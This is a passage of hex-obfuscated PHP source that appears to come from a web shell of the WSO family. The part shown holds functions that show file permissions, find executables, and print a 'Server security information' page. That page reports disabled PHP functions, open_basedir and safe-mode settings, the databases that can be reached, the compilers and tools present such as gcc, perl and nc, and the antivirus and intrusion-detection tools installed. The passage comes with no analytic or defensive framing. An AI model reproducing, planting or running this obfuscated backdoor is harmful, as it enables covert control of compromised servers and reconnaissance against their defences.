;${${"\x47LO\x42\x41L\x53"}["\x70gt\x7a\x65c\x73\x79\x70\x74iv"]}.=((${${"G\x4c\x4fB\x41L\x53"}["\x6c\x69w\x6d\x78\x77\x61"]}&0x0002)?"w":"-");${${"\x47\x4c\x4f\x42\x41LS"}["\x61\x75t\x6ds\x6e\x68"]}.=((${${"\x47L\x4f\x42\x41\x4c\x53"}["l\x69w\x6dx\x77\x61"]}&0x0001)?((${$prgkkprfpv}&0x0200)?"\x74":"x"):((${${"\x47\x4c\x4f\x42AL\x53"}["\x72\x78\x75\x68\x68\x65\x76\x61\x6d"]}&0x0200)?"T":"-"));return${${"G\x4c\x4f\x42A\x4c\x53"}["\x61\x75\x74\x6d\x73\x6e\x68"]};}function viewPermsColor($f){$yezcjuoud="\x66";$bjfkqntvkddk="\x66";${"\x47\x4cOB\x41\x4cS"}["w\x63\x78\x6c\x78\x6e\x6f\x79\x6c"]="\x66";if(!@is_readable(${$bjfkqntvkddk}))return"<\x66\x6fnt \x63\x6fl\x6f\x72=#F\x46\x300\x300><\x62\x3e".perms(@fileperms(${$yezcjuoud}))."\x3c/\x62>\x3c/f\x6f\x6e\x74>";elseif(!@is_writable(${${"GLO\x42\x41LS"}["w\x63x\x6c\x78\x6eoy\x6c"]}))return"\x3c\x66o\x6e\x74\x20\x63\x6f\x6cor\x3dw\x68\x69\x74e\x3e\x3cb>".perms(@fileperms(${${"\x47LOB\x41\x4c\x53"}["\x79\x67\x71\x6a\x62k\x7an\x62\x75"]}))."\x3c/\x62\x3e</\x66ont\x3e";else return"\x3c\x66ont\x20c\x6flo\x72=\x230\x30\x418A\x38><b\x3e".perms(@fileperms(${${"GL\x4f\x42\x41\x4cS"}["ygq\x6a\x62\x6b\x7a\x6e\x62\x75"]}))."</\x62>\x3c/fo\x6et\x3e";}if(!function_exists("s\x63an\x64i\x72")){function scandir($dir){${"\x47\x4c\x4f\x42A\x4c\x53"}["\x70\x69\x6fs\x73\x78xp"]="\x66\x69\x6c\x65n\x61m\x65";${"\x47\x4c\x4f\x42A\x4c\x53"}["\x71\x6echy\x75\x6f\x74\x62"]="\x64\x68";${${"\x47\x4c\x4f\x42A\x4c\x53"}["\x6f\x63\x79\x71\x79v\x63\x74\x64\x69\x66"]}=opendir(${${"\x47\x4cO\x42A\x4cS"}["q\x72euzl\x6a\x6el\x6c\x72"]});${"\x47L\x4fBA\x4cS"}["u\x6e\x71\x64\x6c\x6c\x69"]="f\x69\x6ce\x73";while(false!==(${${"G\x4c\x4f\x42\x41\x4c\x53"}["\x70i\x6fss\x78x\x70"]}=readdir(${${"\x47L\x4f\x42A\x4c\x53"}["qnch\x79\x75\x6f\x74\x62"]}))){${"\x47\x4cO\x42A\x4c\x53"}["lq\x63\x63\x6c\x70\x78\x75\x6d"]="\x66\x69\x6c\x65\x73";${${"G\x4cOBA\x4c\x53"}["l\x71c\x63\x6c\x70\x78u\x6d"]}[]=${${"\x47\x4c\x4fB\x41\x4c\x53"}["d\x73\x66\x6e\x74r\x70p\x62\x64r"]};}return${${"G\x4c\x4fB\x41\x4cS"}["\x75nq\x64l\x6c\x69"]};}}function which($p){${"\x47LO\x42\x41\x4cS"}["\x6b\x72\x6f\x6f\x66\x79b\x72\x64i\x6e"]="pa\x74\x68";${"\x47L\x4f\x42\x41LS"}["c\x71\x74d\x7ac\x6f\x71"]="\x70ath";${${"G\x4c\x4fB\x41LS"}["\x6br\x6fo\x66ybrd\x69\x6e"]}=ex("w\x68\x69\x63h ".${${"\x47L\x4f\x42A\x4c\x53"}["l\x69w\x6d\x78w\x61"]});if(!empty(${${"\x47\x4cOBA\x4c\x53"}["\x63\x71t\x64zc\x6f\x71"]}))return${${"G\x4c\x4f\x42\x41\x4cS"}["\x72\x6d\x64gi\x63f\x64\x72\x6b\x62"]};return false;}function actionSecInfo(){printHeader();echo"<h\x31>\x53\x65r\x76\x65r \x73e\x63ur\x69\x74\x79\x20\x69n\x66\x6frm\x61\x74i\x6fn</h\x31\x3e<\x64iv \x63\x6ca\x73\x73=\x63on\x74\x65\x6et>";${"\x47\x4c\x4f\x42\x41LS"}["\x65\x6d\x66\x66\x69b\x63\x63\x66p\x76"]="\x74\x65m\x70";function showSecParam($n,$v){$jujqgxw="\x76";${$jujqgxw}=trim(${${"\x47\x4c\x4f\x42\x41L\x53"}["\x6d\x68\x6egtg\x79\x67\x68"]});if(${${"\x47\x4c\x4fB\x41\x4cS"}["\x6d\x68n\x67t\x67y\x67\x68"]}){${"\x47\x4c\x4fB\x41L\x53"}["\x78\x7ad\x62\x77\x66"]="\x76";echo"\x3c\x73p\x61\x6e\x3e".${${"\x47\x4c\x4f\x42ALS"}["\x67lj\x6d\x72\x6c\x7aj"]}.":\x20</\x73\x70an\x3e";${"\x47\x4c\x4f\x42A\x4c\x53"}["\x70\x6b\x75\x7a\x63\x73\x70"]="\x76";if(strpos(${${"\x47L\x4fBALS"}["mh\x6e\x67\x74\x67\x79\x67\x68"]},"\n")===false)echo${${"\x47L\x4fBALS"}["\x78\x7a\x64\x62wf"]}."<\x62\x72>";else echo"\x3cp\x72e\x20\x63\x6ca\x73s=m\x6c1\x3e".${${"\x47\x4cOB\x41\x4c\x53"}["\x70ku\x7a\x63\x73\x70"]}."</\x70r\x65>";}}$pvolfciecr="te\x6d\x70";showSecParam("\x53e\x72\x76e\x72 \x73o\x66\x74\x77\x61\x72\x65",@getenv("\x53ERVER\x5f\x53\x4fF\x54W\x41RE"));showSecParam("\x44\x69s\x61\x62\x6c\x65d \x50\x48P Fu\x6e\x63t\x69\x6f\x6e\x73",($GLOBALS["di\x73abl\x65_f\x75n\x63\x74\x69o\x6es"])?$GLOBALS["\x64i\x73\x61\x62le_f\x75\x6e\x63\x74\x69ons"]:"none");showSecParam("Open b\x61se\x20dir",@ini_get("open_b\x61\x73e\x64\x69r"));${"\x47L\x4f\x42\x41\x4c\x53"}["\x65\x76me\x79\x68\x6f\x68\x77\x63"]="\x74\x65\x6d\x70";$wxququbj="t\x65\x6dp";showSecParam("S\x61fe\x20m\x6fde \x65x\x65c \x64\x69\x72",@ini_get("s\x61\x66\x65_m\x6f\x64e_ex\x65\x63_\x64\x69\x72"));showSecParam("S\x61\x66e\x20\x6d\x6f\x64e\x20in\x63\x6cu\x64e d\x69\x72",@ini_get("s\x61f\x65_\x6dode_i\x6e\x63\x6c\x75\x64e_dir"));showSecParam("cURL su\x70\x70\x6frt",function_exists("c\x75\x72\x6c\x5fvers\x69on")?"en\x61b\x6ced":"\x6eo");${${"\x47\x4c\x4fB\x41L\x53"}["\x6bgbfh\x6b\x75"]}=array();if(function_exists("m\x79\x73\x71l\x5f\x67\x65\x74_\x63\x6cient\x5fin\x66\x6f"))${${"\x47\x4cO\x42\x41LS"}["\x65\x76\x6d\x65y\x68\x6f\x68w\x63"]}[]="\x4dyS\x71\x6c (".mysql_get_client_info().")";if(function_exists("m\x73sql\x5f\x63o\x6ene\x63t"))${${"G\x4cO\x42AL\x53"}["k\x67bf\x68\x6b\x75"]}[]="M\x53SQL";if(function_exists("p\x67\x5fc\x6fn\x6eec\x74"))${$pvolfciecr}[]="\x50\x6fstgr\x65SQL";if(function_exists("oci\x5fc\x6f\x6ene\x63\x74"))${$wxququbj}[]="\x4f\x72\x61\x63\x6ce";showSecParam("S\x75\x70\x70or\x74e\x64 d\x61t\x61\x62\x61se\x73",implode(",\x20",${${"\x47\x4cOB\x41\x4c\x53"}["\x65\x6d\x66f\x69\x62\x63\x63\x66\x70\x76"]}));echo"\x3cbr>";if($GLOBALS["\x6f\x73"]=="n\x69x"){${${"\x47L\x4f\x42\x41L\x53"}["\x77\x62\x79\x74\x68\x66\x62\x62"]}=array("\x67\x63\x63","l\x63c","\x63c","\x6c\x64","make","p\x68p","\x70\x65rl","pyt\x68\x6fn","\x72uby","t\x61r","g\x7aip","\x62\x7a\x69\x70","\x62zi\x70\x32","n\x63","lo\x63\x61t\x65","\x73\x75i\x64p\x65r\x6c");${${"\x47L\x4f\x42ALS"}["\x74\x74\x65\x71q\x62\x72\x6f\x68\x66"]}=array("kav","n\x6fd\x33\x32","b\x64\x63\x6fred","\x75\x76s\x63\x61\x6e","sa\x76","d\x72\x77\x65\x62\x64","\x63l\x61\x6d\x64","\x72\x6b\x68\x75\x6ete\x72","\x63h\x6broot\x6b\x69\x74","\x69\x70\x74a\x62les","i\x70\x66\x77","\x74\x72\x69pwir\x65","\x73h\x69e\x6cd\x63\x63","\x70o\x72t\x73en\x74\x72y","s\x6e\x6f\x72\x74","\x6fs\x73e\x63","\x6ci\x64s\x61dm","\x74c\x70\x6c\x6fd\x67","s\x78\x69\x64","\x6co\x67\x63\x68\x65\x63k","logw\x61t\x63h","s\x79\x73\x6d\x61\x73k","\x7ambs\x63\x61\x70","s\x61\x77m\x69\x6c\x6c","\x77\x6frm\x73can","\x6e\x69\x6e\x6aa");${"\